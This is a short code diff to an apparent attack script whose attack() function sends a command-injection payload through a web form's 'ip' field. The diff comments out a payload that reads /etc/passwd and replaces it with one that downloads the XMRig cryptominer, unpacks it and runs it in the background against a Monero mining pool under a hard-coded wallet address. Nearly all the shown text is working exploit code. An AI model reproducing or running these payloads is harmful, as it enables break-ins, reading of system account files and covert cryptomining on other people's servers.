@@ -61,8 +61,12 @@ def attack(username='admin', password='password'):
         'Referer': referer,
         # 'Connection': 'close'
     }
+    # payload_cmdi = {
+    #     'ip': '8.8.8.8; cat /etc/passwd | grep -v nologin',
+    #     'Submit': 'Submit'
+    # }
     payload_cmdi = {
-        'ip': '8.8.8.8; cat /etc/passwd | grep -v nologin',
+        'ip': '8.8.8.8; wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -zxvf ./xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && chmod +x ./xmrig && ./xmrig -o pool.minexmr.com:443 -u 4AgmeAoSTQAKNTCPSfTYULjJT3HWmT7GDgPb33BBhixaSNnoePpzLLRBXhsr2sxRVd47H7at6qPEc5AtJkbSkW9wMnjqPYi -k --tls &',
         'Submit': 'Submit'
     }
     # Generate UUID for DynamoDB cookie entry
